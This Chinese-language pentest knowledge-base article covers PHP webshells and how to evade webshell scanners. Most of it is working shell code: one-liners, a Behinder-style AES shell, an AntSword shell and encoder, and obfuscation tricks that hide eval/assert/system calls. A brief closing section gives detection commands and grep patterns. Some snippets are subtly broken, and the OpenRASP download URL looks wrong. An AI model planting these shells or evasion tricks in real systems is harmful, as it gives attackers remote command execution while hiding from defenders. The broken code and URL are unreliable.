---
title: "WebShell查杀与免杀实战"
description: "WebShell变形免杀技术、流量加密、蚁剑/冰蝎/Godzilla使用"
pubDate: 2026-05-18
heroImage: ""
tags: ["渗透测试", "WebShell", "免杀"]
category: "kb"
severity: "info"
cve: ""
vul_type: "WebShell"
---

# WebShell查杀与免杀实战

## 常见WebShell类型

### 1. 一句话木马

```php
<?php @eval($_POST[x]);?>
<?php system($_GET[cmd]);?>
<?php assert($_POST[x]);?>
<?php preg_replace("/e","eval($_POST[x])","info");?>
<?php $_GET[a]($_GET[b]);?>  // 可变函数
<?=`ls`;?>  // 反引号执行
<?php $a = str_replace('x','','axsxxsxrx');$a($_POST[pass]);?>
```

### 2. 冰蝎WebShell

```php
<?php
@error_reporting(0);
session_start();
$key=base64_decode("xxxx"); // 密钥
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
    $t="base64_decode";
    $post=$t($post."");
    for($i=0;$i<strlen($post);$i++) {
         $post[$i] = $post[$i]^$key[$i+1];
    }
}
else
{
    $post=openssl_decrypt($post,"AES128",$key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p){eval($p."");}}
@call_user_func(new C(),$params);
?>
```

### 3. 蚁剑WebShell

```php
<?php
    $W="ASS"."ERT";
    @$W(base64_decode($_POST['ant']));
?>
```

---

## WebShell免杀技巧

### 1. 字符串变形

```php
<?php
$a = "ass"."ert";
$a($_POST[x]);
?>

<?php
$b = substr(strrev("txeTnejIO"),2);
$b($_POST[x]);
?>

<?php
$f = create_function('', 'eval($_POST[x]);');
$f();
?>
```

### 2. 变量覆盖

```php
<?php
$_++;
$_++;
$_++;
$_++;
$____ = $$_[++$_][++$_];
$____($_POST[x]);
// $_=system, $_=exec, $_=passthru, $_=popen
?>

<?php
$func = new ReflectionFunction('system');
echo $func->invoke($_GET[0]);
?>
```

### 3. 类和反射

```php
<?php
class WebShell {
    public function __construct($cmd) {
        system($cmd);
    }
}
new WebShell($_POST[x]);
?>

<?php
(new ReflectionMethod('system','exec'))->invoke(null,$_POST[x]);
?>
```

### 4. 回调函数

```php
<?php
call_user_func('assert',$_POST[x]);
call_user_func_array('assert',[$_POST[x]]);
array_map('assert',[$_POST[x]]);
filter_var($_POST[x],FILTER_CALLBACK,['options'=>'assert']);
?>
```

### 5. 无字母Shell

```php
<?php
// PHP7.0+ 无数字字母GetShell
$_=[];
$_=@"$_"; // $_="Array"
$_=$_['+']; // 构造任意字符
?>
```

---

## 流量加密

### 冰蝎加密

冰蝎WebShell使用AES加密流量，密钥在连接时动态协商。

### 蚁剑编码器

```javascript
'use strict';
module.exports = function (pwd, data, ext) {
    // 自定义编码逻辑
    data[pwd] = Buffer.from(JSON.stringify({
        _: 0, __: ext.opts.path
    })).toString('base64');
    return data;
}
```

---

## 主流WebShell工具

| 工具 | 特点 | 流量特征 |
|------|------|---------|
| 蚁剑 | 开源/可自定义编码器 | Base64/AES |
| 冰蝎 | 加密流量/AES | AES加密 |
| Godzilla | 加密流量/插件多 | AES+混淆 |
| Cknife | 界面化/Multipart | 明文/Base64 |

---

## WebShell检测方法

### 1. D盾查杀

```bash
# Linux
./d_safe_linux_amd64 -path /var/www/html -level 3

# Windows GUI
D盾.exe
```

### 2.河马查杀

```bash
# Linux
wget https://www.shellpub.com/hm-linux-amd64.tar.gz
tar -xf hm-linux-amd64.tar.gz
./hm scan /var/www/html

# Web在线扫描
https://n.shellpub.com/
```

### 3. grep关键词检测

```bash
# Linux 命令行查找
find /var/www/html -name "*.php" -exec grep -l "eval\|assert\|system\|exec\|passthru\|shell_exec" {} \;

# 查找可疑函数组合
grep -r "call_user_func\|create_function\|ReflectionMethod\|array_map\|preg_replace.*e" /var/www/html/
```

### 4. OpenRASP免疫

```bash
# 安装OpenRASP
curl -o /tmp/openrasp.tar.gz https://packages.baeldung.com/openrasp/1.3/agent.tar.gz
tar -xzf /tmp/openrasp.tar.gz -C /usr/local/
```
